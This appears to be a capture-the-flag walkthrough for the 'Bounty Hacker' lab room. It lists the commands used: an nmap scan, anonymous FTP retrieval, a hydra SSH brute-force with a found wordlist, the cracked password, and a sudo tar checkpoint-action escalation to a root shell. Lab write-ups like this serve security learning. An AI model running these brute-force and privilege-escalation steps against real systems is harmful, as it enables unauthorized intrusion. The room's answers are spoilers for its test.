# Bounty Hacker

You were boasting on and on about your elite hacker skills in the bar and a few Bounty Hunters decided they'd take you up on claims! Prove your status is more than just a few glasses at the bar. I sense bell peppers & beef in your future!

- Deploy the machine.

	no answer needed

- Find open ports on the machine

	no answer needed

	- `nmap -Pn <TARGET_IP>`

- Who wrote the task list?

	- `ftp <TARGET_IP>`
	- `user`
	- `anonymous`
	- `recv locks.txt`
	- `recv task.txt`
	- `cat task.txt`
	- `lin`

- What service can you bruteforce with the text file found?

	- `ssh`

- What is the users password? 

	- `hydra -s 22 -v -V -l 'lin' -P locks.txt -t 8 <TARGET_IP> ssh`
	- `RedDr4gonSynd1cat3`

- user.txt

	- `ssh lin@<TARGET_IP>` and the enter `yes` and the password `RedDr4gonSynd1cat3`
	- `ls`
	- `cat user.txt`
	- `THM{******SyNd1C4T3}`

- root.txt

	- Type `sudo -l`, enter the password and you can see lin user can run `tar` command with sudo.
	- Search on [GTFObins](https://gtfobins.github.io/) `tar`
	- Then search for `sudo`
	- Found this: `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh`
	- Execute this and then `cat /root/root.txt`
	- `THM{*************}`




